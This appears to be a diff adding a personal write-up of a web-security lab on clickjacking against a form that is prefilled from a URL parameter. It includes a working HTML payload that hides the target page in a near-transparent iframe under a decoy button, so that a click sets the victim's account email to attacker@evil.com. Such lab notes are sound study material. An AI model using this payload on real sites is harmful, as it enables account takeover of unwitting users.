@@ -1,0 +1,55 @@
+Clickjacking with form input data prefilled from a URL parameter
+
+**Category**: Clickjacking  
+**Difficulty**: Apprentice
+
+---
+
+## Overview / What I Learned
+
+- This lab demonstrates how clickjacking can be used to trick users into submitting sensitive forms.
+- The form on the vulnerable site pre-fills input fields based on URL parameters, allowing attackers to control form values.
+- I learned how to align a hidden iframe over a visible decoy element and use opacity settings to create a convincing trap.
+---
+
+## Exploit Steps / Attack Methodology
+
+### 1. Setup
+
+- Logged into the lab with credentials:
+  - Username: wiener  
+  - Password: peter  
+- Navigated to `/my-account` and confirmed that the **email change form** prepopulates the email field using the `email` parameter in the URL.
+
+### 2. Confirmed Prefill Behavior
+
+- Visiting `/my-account?email=attacker@evil.com` correctly filled in the email field with the value from the URL.
+
+### 3. Clickjacking HTML Payload
+
+- Crafted the following HTML payload and hosted it on the exploit server:
+
+```html
+<style>
+  iframe {
+    position: relative;
+    width: 500px;
+    height: 700px;
+    opacity: 0.0001;
+    z-index: 2;
+  }
+
+  div {
+    position: absolute;
+    top: 400px;
+    left: 80px;
+    z-index: 1;
+    font-size: 20px;
+    background-color: #e0e0e0;
+    padding: 10px;
+    cursor: pointer;
+  }
+</style>
+
+<div>Click me</div>
+<iframe src="https://LabId.web-security-academy.net/my-account?email=attacker@evil.com"></iframe>
